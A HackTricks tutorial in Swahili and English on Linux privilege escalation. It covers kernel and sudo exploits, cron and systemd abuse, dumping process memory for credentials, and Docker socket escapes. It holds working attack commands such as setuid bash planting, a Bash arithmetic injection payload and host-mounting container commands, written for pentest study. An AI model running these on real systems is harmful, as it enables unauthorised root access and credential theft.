# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata taarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya kigezo cha `PATH`, huenda ukaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za mazingira

Je, kuna taarifa zinazovutia, nywila, au API keys katika vigezo vya mazingira?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit yoyote inayoweza kutumika ku-escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo na udhaifu na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (tekeleza kwenye victim, inakagua tu exploits za kernel 2.x)

Kila wakati **tafuta toleo la kernel kwenye Google**, pengine toleo lako la kernel limeandikwa katika exploit fulani ya kernel na basi utahakikisha exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo ya sudo yaliyo dhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo linaloweza kuathiriwa kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi kuhusu ukusanyaji wa taarifa za mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Taja ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Kutoroka

Iwapo uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote ni unmounted unaweza kujaribu ku-mount na kukagua kwa taarifa binafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inashauriwa kucompile kwenye mashine utakayoitumia (au kwenye mashine inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zimewekwa

Kagua **toleo la paketi na huduma zilizosanikishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza exploited kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mkono toleo la programu zilizosanikishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Kama una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kukagua programu zilizowekwa ndani ya mashine kuona kama ni za zamani au zenye udhaifu.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na manufaa, kwa hiyo inashauriwa kutumia programu kama OpenVAS au zinazofanana zitakazokagua kama toleo lolote la programu iliyosakinishwa linaweza kuwa hatarini kwa exploits zinazojulikana_

## Michakato

Angalia **ni michakato gani** inayotekelezwa na angalia kama kuna mchakato wowote unao **mamlaka zaidi kuliko inavyostahili** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Pia angalia ruhusa zako juu ya binaries za mchakato, huenda ukaweza kuandika juu ya binares za mtu mwingine.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato yenye udhaifu inayotekelezwa mara kwa mara au wakati seti ya masharti yanatimizwa.

### Kumbukumbu za mchakato

Baadhi ya huduma za server huhifadhi **credentials kwa maandishi wazi ndani ya memory**.\
Kawaida utahitaji **root privileges** kusoma memory ya michakato inayomilikiwa na watumiaji wengine, hivyo kwa kawaida hii ni ya maana zaidi ukiwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba sasa hivi mashine nyingi **haziruhusu ptrace kwa chaguo-msingi** jambo ambalo linamaanisha huwezi kudump michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa za juu.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza ku-debugged, mradi tu zina uid sawa. Hii ndio njia ya kawaida jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee ndiye anaweza ku-debugged.
> - **kernel.yama.ptrace_scope = 2**: Ni admin pekee anaweza kutumia ptrace, kwa sababu inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kufuatiliwa kwa ptrace. Mara inapowekwa, inahitaji kuanzisha upya ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato iliyotolewa, **maps yanaonyesha jinsi kumbukumbu imepangwa ndani ya mchakato huo** katika nafasi ya anwani pepe; pia inaonyesha **ruhusa za kila eneo lililopangwa**. Fayili bandia ya **mem** **inafunua kumbukumbu ya mchakato yenyewe**. Kutoka kwenye fayili ya **maps** tunajua ni **eneo za kumbukumbu yanayosomwa** na ofseti zao. Tunatumia taarifa hizi kufanya **seek into the mem file and dump all readable regions** kwa faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji kwa mfumo wa **kumbukumbu ya kimwili**, sio kumbukumbu ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni toleo la Linux la zana maarufu ProcDump kutoka kwenye kifurushi cha Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili dump a process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mikono kuondoa mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Taarifa za kuingia kutoka Process Memory

#### Mfano la mkono

Ikiwa utagundua kwamba authenticator process inaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (angalia sehemu zilizotangulia ili kupata njia tofauti za ku-dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ita **steal clear text credentials from memory** na kutoka kwa baadhi ya **mafayela yanayojulikana vizuri**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Kipengele                                          | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root anazitumia? tumia symlinks? unda files maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Angalia jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kusababisha matokeo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imefuatiwa na path kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Ikiwa root cron/parser inasoma untrusted log fields na kuziingiza ndani ya arithmetic context, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inapoendesha.

- Kwa nini inafanya kazi: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Hivyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` inabadilishwa kwanza (kukimbiza command), kisha nambari `0` iliyobaki inatumiwa kwa arithmetic ili script iendelee bila errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Pata attacker-controlled text imeandikwa kwenye parsed log ili field inayofanana na nambari iwe na command substitution na ifunge kwa digit. Hakikisha command yako haitachapishi kwenye stdout (au uilekeze) ili arithmetic ibaki valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa unaweza **can modify a cron script** executed by root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Iwapo script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa muhimu kufuta folder hiyo na **kuunda folder ya symlink kwa nyingine** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia processes kutafuta processes zinazoendeshwa kila 1, 2 au 5 dakika. Labda unaweza kuchukua fursa yake na escalate privileges.

Kwa mfano, ili **monitor every 0.1s during 1 minute**, **sort by less executed commands** na kufuta commands ambazo zimeendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (kumbuka carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Mafayela ya _.service_ yanayoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`; ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** backdoor yako **wakati** huduma inapo**anzishwa**, **irudishwe** au **imiswe** (labda utahitaji kusubiri hadi mashine ipunguzwe na kuanzishwa tena).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Mafaili ya binari za huduma yanayoweza kuandikwa

Tambua kwamba ikiwa una **idhini za kuandika kwa binari zinazotekelezwa na huduma**, unaweza kuzibadilisha kuwa backdoors ili wakati huduma zitakaporudi kutekelezwa, backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:
```bash
systemctl show-environment
```
Iwapo utagundua kwamba unaweza **kuandika** katika yoyote ya folda za njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** files kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na relative path binary** ndani ya folda ya PATH ya systemd unayoweza kuandika, na wakati service itaombwa kutekeleza hatua yenye udhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na ruhusa za juu kwa kawaida hawawezi kuanza/kusitisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za unit za systemd ambazo majina yao yanahitimisha kwa `**.timer**` na zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala ya cron kwa sababu zina msaada uliojengwa kwa matukio ya kalenda na matukio ya muda ya monotonic, na zinaweza kuendeshwa kwa asynchronous.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya vitu vya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma maana ya Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta systemd unit fulani (kama a `.service`) ambayo ni **executing a writable binary**
- Tafuta systemd unit fulani ambayo ni **executing a relative path** na wewe una **writable privileges** over the **systemd PATH** (ili kuigiza executable hiyo)

Jifunze zaidi kuhusu timers kwa `man systemd.timer`.

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** inawezeshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **process communication** kwenye mashine moja au tofauti ndani ya modeli za client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vinavyovutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hizi chaguzi ni tofauti lakini muhtasari hutumika kuonyesha wapi itasikiliza socket (njia ya AF_UNIX socket file, IPv4/6 na/au nambari ya port kusikiliza, nk.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **service instance huanzishwa kwa kila incoming connection** na socket ya connection pekee ndiyo inapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikiliza zenyewe zina **pitishwa kwa started service unit**, na unit moja tu ya service huanzishwa kwa muunganisho wote. Thamani hii hairuhusiwi kwa datagram sockets na FIFOs ambapo service unit moja bila masharti inashughulikia trafiki zote zinazoingia. **Kwa chaguo-msingi ni false**. Kwa sababu za utendakazi, inapendekezwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambazo **hutekelezwa kabla** au **baada** ya kusikiliza **sockets**/FIFOs kuundwa na ku-bound, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili (absolute filename), ikifuatiwa na vigezo kwa mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo **hutekelezwa kabla** au **baada** ya kusikiliza **sockets**/FIFOs kufungwa na kuondolewa, mtawalia.
- `Service`: Inaelezea jina la unit ya **service** **kuzinduliwa** kwenye **incoming traffic**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa kawaida, inarejea service yenye jina sawa na socket (ikiwa suffix imebadilishwa). Katika kesi nyingi, haitakuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili `.socket` ambayo ni **writable**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itakapoundwa. Kwa hivyo, **labda utahitaji kusubiri mpaka mashine ianze upya.**\ _Kumbuka mfumo lazima utumie mpangilio huo wa faili ya socket au backdoor haitatekelezwa_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho la raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa Exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na **sockets listening for HTTP** requests (_sio .socket files ninazozungumzia, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Socket ya Docker inayoweza kuandikwa

Socket ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa kawaida, inaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi cha `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye socket ya Docker, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ukiwa na root-level access kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa Moja**

Katika kesi ambapo Docker CLI haipatikani, Docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **Orodhesha Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container ambayo inamount root directory ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi punde:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho na container, kuwezesha utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwenye filesystem ya host.

### Others

Kumbuka kwamba ikiwa una write permissions over the docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa **inter-Process Communication (IPC)** unaowezesha programu kuwasiliana kwa ufanisi na kushiriki data. Umebuniwa kwa kuzingatia mfumo wa kisasa wa Linux, unatolewa muundo thabiti kwa aina mbalimbali za mawasiliano kati ya programu.

System hii ni yenye uwezo mkubwa, inasaidia IPC ya msingi inayoboreshwa kwa kubadilishana data kati ya processes, ikikumbusha **enhanced UNIX domain sockets**. Zaidi yake, husaidia kutangaza matukio au signals, ikikuza muunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kuamsha music player kukaza kwa kimya (mute), kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, kurahisisha service requests na method invocations kati ya programu, kuifanya michakato iliyokuwa ngumu kuwa rahisi.

D-Bus inafanya kazi kwa kutumia mfano wa **allow/deny model**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, nk.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinafafanua jinsi ya kuingiliana na bus, na zinaweza kuruhusu privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina user au group maalum zinatumika kwa wote, wakati "default" context policies zinatumika kwa wote ambao hawajafunikwa na sera maalum zingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
